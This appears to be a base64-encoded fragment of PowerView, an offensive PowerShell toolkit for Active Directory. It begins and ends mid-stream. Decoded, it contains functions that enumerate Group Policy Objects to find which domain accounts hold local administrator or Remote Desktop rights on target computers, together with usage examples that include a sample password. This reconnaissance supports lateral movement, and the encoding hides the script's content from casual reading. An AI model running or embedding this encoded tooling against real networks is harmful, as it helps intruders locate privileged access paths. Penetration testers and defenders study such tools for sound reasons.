zIHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgaWYgKCAoJFRhcmdldFNJRHNbMF0gLWVxICcqJykgLW9yICgkVGFyZ2V0U0lEcyAtQ29udGFpbnMgJF8pICkgewogICAgICAgICAgICAgICAgICAgICAgICAkR1BPZ3JvdXAKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgIyBpZiB0aGUgZ3JvdXAgaXMgYSAnbWVtYmVyb2YnIHRoZSBncm91cCB3ZSdyZSBsb29raW5nIGZvciwgY2hlY2sgR3JvdXBTSUQgYWdhaW5zdCB0aGUgdGFyZ3QgU0lEcwogICAgICAgICAgICBpZiAoICgkR1BPZ3JvdXAuR3JvdXBNZW1iZXJPZiAtY29udGFpbnMgJFRhcmdldExvY2FsU0lEKSApIHsKICAgICAgICAgICAgICAgIGlmICggKCRUYXJnZXRTSURzWzBdIC1lcSAnKicpIC1vciAoJFRhcmdldFNJRHMgLUNvbnRhaW5zICRHUE9ncm91cC5Hcm91cFNJRCkgKSB7CiAgICAgICAgICAgICAgICAgICAgJEdQT2dyb3VwCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9IHwgU29ydC1PYmplY3QgLVByb3BlcnR5IEdQT05hbWUgLVVuaXF1ZQoKICAgICAgICAkR1BPZ3JvdXBzIHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICRHUE9uYW1lID0gJF8uR1BPRGlzcGxheU5hbWUKICAgICAgICAgICAgJEdQT2d1aWQgPSAkXy5HUE9OYW1lCiAgICAgICAgICAgICRHUE9QYXRoID0gJF8uR1BPUGF0aAogICAgICAgICAgICAkR1BPVHlwZSA9ICRfLkdQT1R5cGUKICAgICAgICAgICAgaWYgKCRfLkdyb3VwTWVtYmVycykgewogICAgICAgICAgICAgICAgJEdQT01lbWJlcnMgPSAkXy5Hcm91cE1lbWJlcnMKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRHUE9NZW1iZXJzID0gJF8uR3JvdXBTSUQKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJEZpbHRlcnMgPSAkXy5GaWx0ZXJzCgogICAgICAgICAgICBpZiAoJFRhcmdldFNJRHNbMF0gLWVxICcqJykgewogICAgICAgICAgICAgICAgIyBpZiB0aGUgKiB3aWxkY2FyZCB3YXMgdXNlZCwgc2V0IHRoZSB0YXJnZXRzIHRvIGFsbCBHUE8gbWVtYmVycyBzbyBldmVyeXRoaW5nIGl0IG91dHB1dAogICAgICAgICAgICAgICAgJFRhcmdldE9iamVjdFNJRHMgPSAkR1BPTWVtYmVycwogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgJFRhcmdldE9iamVjdFNJRHMgPSAkVGFyZ2V0T2JqZWN0U0lECiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICMgZmluZCBhbnkgT1VzIHRoYXQgaGF2ZSB0aGlzIEdQTyBsaW5rZWQgdGhyb3VnaCBncExpbmsKICAgICAgICAgICAgR2V0LURvbWFpbk9VIEBDb21tb25Bcmd1bWVudHMgLVJhdyAtUHJvcGVydGllcyAnbmFtZSxkaXN0aW5ndWlzaGVkbmFtZScgLUdQTGluayAkR1BPR3VpZCB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgIGlmICgkRmlsdGVycykgewogICAgICAgICAgICAgICAgICAgICRPVUNvbXB1dGVycyA9IEdldC1Eb21haW5Db21wdXRlciBAQ29tbW9uQXJndW1lbnRzIC1Qcm9wZXJ0aWVzICdkbnNob3N0bmFtZSxkaXN0aW5ndWlzaGVkbmFtZScgLVNlYXJjaEJhc2UgJF8uUGF0aCB8IFdoZXJlLU9iamVjdCB7JF8uZGlzdGluZ3Vpc2hlZG5hbWUgLW1hdGNoICgkRmlsdGVycy5WYWx1ZSl9IHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgZG5zaG9zdG5hbWUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICRPVUNvbXB1dGVycyA9IEdldC1Eb21haW5Db21wdXRlciBAQ29tbW9uQXJndW1lbnRzIC1Qcm9wZXJ0aWVzICdkbnNob3N0bmFtZScgLVNlYXJjaEJhc2UgJF8uUGF0aCB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IGRuc2hvc3RuYW1lCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYgKCRPVUNvbXB1dGVycykgewogICAgICAgICAgICAgICAgICAgIGlmICgkT1VDb21wdXRlcnMgLWlzbm90IFtTeXN0ZW0uQXJyYXldKSB7JE9VQ29tcHV0ZXJzID0gQCgkT1VDb21wdXRlcnMpfQoKICAgICAgICAgICAgICAgICAgICBGb3JFYWNoICgkVGFyZ2V0U2lkIGluICRUYXJnZXRPYmplY3RTSURzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRPYmplY3QgPSBHZXQtRG9tYWluT2JqZWN0IEBDb21tb25Bcmd1bWVudHMgLUlkZW50aXR5ICRUYXJnZXRTaWQgLVByb3BlcnRpZXMgJ3NhbWFjY291bnR0eXBlLHNhbWFjY291bnRuYW1lLGRpc3Rpbmd1aXNoZWRuYW1lLG9iamVjdHNpZCcKCiAgICAgICAgICAgICAgICAgICAgICAgICRJc0dyb3VwID0gQCgnMjY4NDM1NDU2JywnMjY4NDM1NDU3JywnNTM2ODcwOTEyJywnNTM2ODcwOTEzJykgLWNvbnRhaW5zICRPYmplY3Quc2FtYWNjb3VudHR5cGUKCiAgICAgICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZyA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAgICAgJEdQT0xvY2FsR3JvdXBNYXBwaW5nIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ09iamVjdE5hbWUnICRPYmplY3Quc2FtYWNjb3VudG5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJEdQT0xvY2FsR3JvdXBNYXBwaW5nIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ09iamVjdEROJyAkT2JqZWN0LmRpc3Rpbmd1aXNoZWRuYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdPYmplY3RTSUQnICRPYmplY3Qub2JqZWN0c2lkCiAgICAgICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdEb21haW4nICREb21haW4KICAgICAgICAgICAgICAgICAgICAgICAgJEdQT0xvY2FsR3JvdXBNYXBwaW5nIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0lzR3JvdXAnICRJc0dyb3VwCiAgICAgICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHUE9EaXNwbGF5TmFtZScgJEdQT25hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJEdQT0xvY2FsR3JvdXBNYXBwaW5nIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dQT0d1aWQnICRHUE9HdWlkCiAgICAgICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHUE9QYXRoJyAkR1BPUGF0aAogICAgICAgICAgICAgICAgICAgICAgICAkR1BPTG9jYWxHcm91cE1hcHBpbmcgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR1BPVHlwZScgJEdQT1R5cGUKICAgICAgICAgICAgICAgICAgICAgICAgJEdQT0xvY2FsR3JvdXBNYXBwaW5nIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0NvbnRhaW5lck5hbWUnICRfLlByb3BlcnRpZXMuZGlzdGluZ3Vpc2hlZG5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJEdQT0xvY2FsR3JvdXBNYXBwaW5nIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0NvbXB1dGVyTmFtZScgJE9VQ29tcHV0ZXJzCiAgICAgICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZy5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuR1BPTG9jYWxHcm91cE1hcHBpbmcnKQogICAgICAgICAgICAgICAgICAgICAgICAkR1BPTG9jYWxHcm91cE1hcHBpbmcKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICMgZmluZCBhbnkgc2l0ZXMgdGhhdCBoYXZlIHRoaXMgR1BPIGxpbmtlZCB0aHJvdWdoIGdwTGluawogICAgICAgICAgICBHZXQtRG9tYWluU2l0ZSBAQ29tbW9uQXJndW1lbnRzIC1Qcm9wZXJ0aWVzICdzaXRlb2JqZWN0YmwsZGlzdGluZ3Vpc2hlZG5hbWUnIC1HUExpbmsgJEdQT0d1aWQgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICBGb3JFYWNoICgkVGFyZ2V0U2lkIGluICRUYXJnZXRPYmplY3RTSURzKSB7CiAgICAgICAgICAgICAgICAgICAgJE9iamVjdCA9IEdldC1Eb21haW5PYmplY3QgQENvbW1vbkFyZ3VtZW50cyAtSWRlbnRpdHkgJFRhcmdldFNpZCAtUHJvcGVydGllcyAnc2FtYWNjb3VudHR5cGUsc2FtYWNjb3VudG5hbWUsZGlzdGluZ3Vpc2hlZG5hbWUsb2JqZWN0c2lkJwoKICAgICAgICAgICAgICAgICAgICAkSXNHcm91cCA9IEAoJzI2ODQzNTQ1NicsJzI2ODQzNTQ1NycsJzUzNjg3MDkxMicsJzUzNjg3MDkxMycpIC1jb250YWlucyAkT2JqZWN0LnNhbWFjY291bnR0eXBlCgogICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZyA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAkR1BPTG9jYWxHcm91cE1hcHBpbmcgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnT2JqZWN0TmFtZScgJE9iamVjdC5zYW1hY2NvdW50bmFtZQogICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdPYmplY3RETicgJE9iamVjdC5kaXN0aW5ndWlzaGVkbmFtZQogICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdPYmplY3RTSUQnICRPYmplY3Qub2JqZWN0c2lkCiAgICAgICAgICAgICAgICAgICAgJEdQT0xvY2FsR3JvdXBNYXBwaW5nIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0lzR3JvdXAnICRJc0dyb3VwCiAgICAgICAgICAgICAgICAgICAgJEdQT0xvY2FsR3JvdXBNYXBwaW5nIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0RvbWFpbicgJERvbWFpbgogICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHUE9EaXNwbGF5TmFtZScgJEdQT25hbWUKICAgICAgICAgICAgICAgICAgICAkR1BPTG9jYWxHcm91cE1hcHBpbmcgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR1BPR3VpZCcgJEdQT0d1aWQKICAgICAgICAgICAgICAgICAgICAkR1BPTG9jYWxHcm91cE1hcHBpbmcgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR1BPUGF0aCcgJEdQT1BhdGgKICAgICAgICAgICAgICAgICAgICAkR1BPTG9jYWxHcm91cE1hcHBpbmcgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR1BPVHlwZScgJEdQT1R5cGUKICAgICAgICAgICAgICAgICAgICAkR1BPTG9jYWxHcm91cE1hcHBpbmcgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQ29udGFpbmVyTmFtZScgJF8uZGlzdGluZ3Vpc2hlZG5hbWUKICAgICAgICAgICAgICAgICAgICAkR1BPTG9jYWxHcm91cE1hcHBpbmcgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQ29tcHV0ZXJOYW1lJyAkXy5zaXRlb2JqZWN0YmwKICAgICAgICAgICAgICAgICAgICAkR1BPTG9jYWxHcm91cE1hcHBpbmcuUFNPYmplY3QuVHlwZU5hbWVzLkFkZCgnUG93ZXJWaWV3LkdQT0xvY2FsR3JvdXBNYXBwaW5nJykKICAgICAgICAgICAgICAgICAgICAkR1BPTG9jYWxHcm91cE1hcHBpbmcKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEdldC1Eb21haW5HUE9Db21wdXRlckxvY2FsR3JvdXBNYXBwaW5nIHsKPCMKLlNZTk9QU0lTCgpUYWtlcyBhIGNvbXB1dGVyIChvciBHUE8pIG9iamVjdCBhbmQgZGV0ZXJtaW5lcyB3aGF0IHVzZXJzL2dyb3VwcyBhcmUgaW4gdGhlIHNwZWNpZmllZApsb2NhbCBncm91cCBmb3IgdGhlIG1hY2hpbmUgdGhyb3VnaCBHUE8gY29ycmVsYXRpb24uCgpBdXRob3I6IEBoYXJtajB5ICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBHZXQtRG9tYWluQ29tcHV0ZXIsIEdldC1Eb21haW5PVSwgR2V0LU5ldENvbXB1dGVyU2l0ZU5hbWUsIEdldC1Eb21haW5TaXRlLCBHZXQtRG9tYWluR1BPTG9jYWxHcm91cCAgCgouREVTQ1JJUFRJT04KClRoaXMgZnVuY3Rpb24gaXMgdGhlIGludmVyc2Ugb2YgR2V0LURvbWFpbkdQT1VzZXJMb2NhbEdyb3VwTWFwcGluZywgYW5kIGZpbmRzIHdoYXQgdXNlcnMvZ3JvdXBzCmFyZSBpbiB0aGUgc3BlY2lmaWVkIGxvY2FsIGdyb3VwIGZvciBhIHRhcmdldCBtYWNoaW5lIHRocm91Z2ggR1BPIGNvcnJlbGF0aW9uLgoKSWYgYSAtQ29tcHV0ZXJJZGVudGl0eSBpcyBzcGVjaWZpZWQsIHJldHJpZXZlIHRoZSBjb21wbGV0ZSBjb21wdXRlciBvYmplY3QsIGF0dGVtcHQgdG8KZGV0ZXJtaW5lIHRoZSBPVSB0aGUgY29tcHV0ZXIgaXMgYSBwYXJ0IG9mLiBUaGVuIHJlc29sdmUgdGhlIGNvbXB1dGVyJ3Mgc2l0ZSBuYW1lIHdpdGgKR2V0LU5ldENvbXB1dGVyU2l0ZU5hbWUgYW5kIHJldHJpZXZlIGFsbCBzaXRlcyBvYmplY3QgR2V0LURvbWFpblNpdGUuIEZvciB0aG9zZSByZXN1bHRzLCBhdHRlbXB0IHRvCmVudW1lcmF0ZSBhbGwgbGlua2VkIEdQT3MgYW5kIGFzc29jaWF0ZWQgbG9jYWwgZ3JvdXAgc2V0dGluZ3Mgd2l0aCBHZXQtRG9tYWluR1BPTG9jYWxHcm91cC4gRm9yCmVhY2ggcmVzdWx0aW5nIEdQTyBncm91cCwgcmVzb2x2ZSB0aGUgcmVzdWx0aW5nIHVzZXIvZ3JvdXAgbmFtZSB0byBhIGZ1bGwgQUQgb2JqZWN0IGFuZApyZXR1cm4gdGhlIHJlc3VsdHMuIFRoaXMgd2lsbCByZXR1cm4gdGhlIGRvbWFpbiBvYmplY3RzIHRoYXQgYXJlIG1lbWJlcnMgb2YgdGhlIHNwZWNpZmllZAotTG9jYWxHcm91cCBmb3IgdGhlIGdpdmVuIGNvbXB1dGVyLgoKT3RoZXJ3aXNlLCBpZiAtT1VJZGVudGl0eSBpcyBzdXBwbGllZCwgdGhlIHNhbWUgcHJvY2VzcyBpcyBleGVjdXRlZCB0byBmaW5kIGxpbmtlZCBHUE9zIGFuZApsb2NhbGdyb3VwIHNwZWNpZmljYXRpb25zLgoKLlBBUkFNRVRFUiBDb21wdXRlcklkZW50aXR5CgpBIFNhbUFjY291bnROYW1lIChlLmcuIFdJTkRPV1MxMCQpLCBEaXN0aW5ndWlzaGVkTmFtZSAoZS5nLiBDTj1XSU5ET1dTMTAsQ049Q29tcHV0ZXJzLERDPXRlc3RsYWIsREM9bG9jYWwpLApTSUQgKGUuZy4gUy0xLTUtMjEtODkwMTcxODU5LTM0MzM4MDkyNzktMzM2NjE5Njc1My0xMTI0KSwgR1VJRCAoZS5nLiA0ZjE2YjZiYy03MDEwLTRjYmYtYjYyOC1mM2NmZTIwZjY5OTQpLApvciBhIGRucyBob3N0IG5hbWUgKGUuZy4gd2luZG93czEwLnRlc3RsYWIubG9jYWwpIGZvciB0aGUgY29tcHV0ZXIgdG8gaWRlbnRpdHkgR1BPIGxvY2FsIGdyb3VwIG1hcHBpbmdzIGZvci4KCi5QQVJBTUVURVIgT1VJZGVudGl0eQoKQW4gT1UgbmFtZSAoZS5nLiBUZXN0T1UpLCBEaXN0aW5ndWlzaGVkTmFtZSAoZS5nLiBPVT1UZXN0T1UsREM9dGVzdGxhYixEQz1sb2NhbCksIG9yCkdVSUQgKGUuZy4gOGE5YmEyMmEtODk3Ny00N2U2LTg0Y2UtOGMyNmFmNGUxZTZhKSBmb3IgdGhlIE9VIHRvIGlkZW50aXR5IEdQTyBsb2NhbCBncm91cCBtYXBwaW5ncyBmb3IuCgouUEFSQU1FVEVSIExvY2FsR3JvdXAKClRoZSBsb2NhbCBncm91cCB0byBjaGVjayBhY2Nlc3MgYWdhaW5zdC4KQ2FuIGJlICJBZG1pbmlzdHJhdG9ycyIgKFMtMS01LTMyLTU0NCksICJSRFAvUmVtb3RlIERlc2t0b3AgVXNlcnMiIChTLTEtNS0zMi01NTUpLApvciBhIGN1c3RvbSBsb2NhbCBTSUQuIERlZmF1bHRzIHRvIGxvY2FsICdBZG1pbmlzdHJhdG9ycycuCgouUEFSQU1FVEVSIERvbWFpbgoKU3BlY2lmaWVzIHRoZSBkb21haW4gdG8gZW51bWVyYXRlIEdQT3MgZm9yLCBkZWZhdWx0cyB0byB0aGUgY3VycmVudCBkb21haW4uCgouUEFSQU1FVEVSIFNlcnZlcgoKU3BlY2lmaWVzIGFuIEFjdGl2ZSBEaXJlY3Rvcnkgc2VydmVyIChkb21haW4gY29udHJvbGxlcikgdG8gYmluZCB0by4KCi5QQVJBTUVURVIgU2VhcmNoU2NvcGUKClNwZWNpZmllcyB0aGUgc2NvcGUgdG8gc2VhcmNoIHVuZGVyLCBCYXNlL09uZUxldmVsL1N1YnRyZWUgKGRlZmF1bHQgb2YgU3VidHJlZSkuCgouUEFSQU1FVEVSIFJlc3VsdFBhZ2VTaXplCgpTcGVjaWZpZXMgdGhlIFBhZ2VTaXplIHRvIHNldCBmb3IgdGhlIExEQVAgc2VhcmNoZXIgb2JqZWN0LgoKLlBBUkFNRVRFUiBTZXJ2ZXJUaW1lTGltaXQKClNwZWNpZmllcyB0aGUgbWF4aW11bSBhbW91bnQgb2YgdGltZSB0aGUgc2VydmVyIHNwZW5kcyBzZWFyY2hpbmcuIERlZmF1bHQgb2YgMTIwIHNlY29uZHMuCgouUEFSQU1FVEVSIFRvbWJzdG9uZQoKU3dpdGNoLiBTcGVjaWZpZXMgdGhhdCB0aGUgc2VhcmNoZXIgc2hvdWxkIGFsc28gcmV0dXJuIGRlbGV0ZWQvdG9tYnN0b25lZCBvYmplY3RzLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSB0YXJnZXQgZG9tYWluLgoKLkVYQU1QTEUKCkdldC1Eb21haW5HUE9Db21wdXRlckxvY2FsR3JvdXBNYXBwaW5nIC1Db21wdXRlck5hbWUgV0lORE9XUzMudGVzdGxhYi5sb2NhbAoKRmluZHMgdXNlcnMgd2hvIGhhdmUgbG9jYWwgYWRtaW4gcmlnaHRzIG92ZXIgV0lORE9XUzMgdGhyb3VnaCBHUE8gY29ycmVsYXRpb24uCgouRVhBTVBMRQoKR2V0LURvbWFpbkdQT0NvbXB1dGVyTG9jYWxHcm91cE1hcHBpbmcgLURvbWFpbiBkZXYudGVzdGxhYi5sb2NhbCAtQ29tcHV0ZXJOYW1lIFdJTkRPV1M0LmRldi50ZXN0bGFiLmxvY2FsIC1Mb2NhbEdyb3VwIFJEUAoKRmluZHMgdXNlcnMgd2hvIGhhdmUgUkRQIHJpZ2h0cyBvdmVyIFdJTkRPV1M0IHRocm91Z2ggR1BPIGNvcnJlbGF0aW9uLgoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpCkdldC1Eb21haW5HUE9Db21wdXRlckxvY2FsR3JvdXBNYXBwaW5nIC1DcmVkZW50aWFsICRDcmVkIC1Db21wdXRlcklkZW50aXR5IFNRTC50ZXN0bGFiLmxvY2FsCgouT1VUUFVUUwoKUG93ZXJWaWV3LkdHUE9Db21wdXRlckxvY2FsR3JvdXBNZW1iZXIKIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5HR1BPQ29tcHV0ZXJMb2NhbEdyb3VwTWVtYmVyJyldCiAgICBbQ21kbGV0QmluZGluZyhEZWZhdWx0UGFyYW1ldGVyU2V0TmFtZSA9ICdDb21wdXRlcklkZW50aXR5JyldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgUGFyYW1ldGVyU2V0TmFtZSA9ICdDb21wdXRlcklkZW50aXR5JywgTWFuZGF0b3J5ID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdDb21wdXRlck5hbWUnLCAnQ29tcHV0ZXInLCAnRGlzdGluZ3Vpc2hlZE5hbWUnLCAnU2FtQWNjb3VudE5hbWUnLCAnTmFtZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVySWRlbnRpdHksCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJFRydWUsIFBhcmFtZXRlclNldE5hbWUgPSAnT1VJZGVudGl0eScpXQogICAgICAgIFtBbGlhcygnT1UnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRPVUlkZW50aXR5LAoKICAgICAgICBbU3RyaW5nXQogICAgICAgIFtWYWxpZGF0ZVNldCgnQWRtaW5pc3RyYXRvcnMnLCAnUy0xLTUtMzItNTQ0JywgJ1JEUCcsICdSZW1vdGUgRGVza3RvcCBVc2VycycsICdTLTEtNS0zMi01NTUnKV0KICAgICAgICAkTG9jYWxHcm91cCA9ICdBZG1pbmlzdHJhdG9ycycsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnQURTUGF0aCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaEJhc2UsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAoKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgQkVHSU4gewogICAgICAgICRDb21tb25Bcmd1bWVudHMgPSBAe30KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkQ29tbW9uQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRDb21tb25Bcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkQ29tbW9uQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRDb21tb25Bcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRDb21tb25Bcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJENvbW1vbkFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJENvbW1vbkFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgfQoKICAgIFBST0NFU1MgewogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVySWRlbnRpdHknXSkgewogICAgICAgICAgICAkQ29tcHV0ZXJzID0gR2V0LURvbWFpbkNvbXB1dGVyIEBDb21tb25Bcmd1bWVudHMgLUlkZW50aXR5ICRDb21wdXRlcklkZW50aXR5IC1Qcm9wZXJ0aWVzICdkaXN0aW5ndWlzaGVkbmFtZSxkbnNob3N0bmFtZScKCiAgICAgICAgICAgIGlmICgtbm90ICRDb21wdXRlcnMpIHsKICAgICAgICAgICAgICAgIHRocm93ICJbR2V0LURvbWFpbkdQT0NvbXB1dGVyTG9jYWxHcm91cE1hcHBpbmddIENvbXB1dGVyICRDb21wdXRlcklkZW50aXR5IG5vdCBmb3VuZC4gVHJ5IGEgZnVsbHkgcXVhbGlmaWVkIGhvc3QgbmFtZS4iCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIEZvckVhY2ggKCRDb21wdXRlciBpbiAkQ29tcHV0ZXJzKSB7CgogICAgICAgICAgICAgICAgJEdQT0d1aWRzID0gQCgpCgogICAgICAgICAgICAgICAgIyBleHRyYWN0IGFueSBHUE9zIGxpbmtlZCB0byB0aGlzIGNvbXB1dGVyJ3MgT1UgdGhyb3VnaCBncExpbmsKICAgICAgICAgICAgICAgICRETiA9ICRDb21wdXRlci5kaXN0aW5ndWlzaGVkbmFtZQogICAgICAgICAgICAgICAgJE9VSW5kZXggPSAkRE4uSW5kZXhPZignT1U9JykKICAgICAgICAgICAgICAgIGlmICgkT1VJbmRleCAtZ3QgMCkgewogICAgICAgICAgICAgICAgICAgICRPVU5hbWUgPSAkRE4uU3ViU3RyaW5nKCRPVUluZGV4KQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAga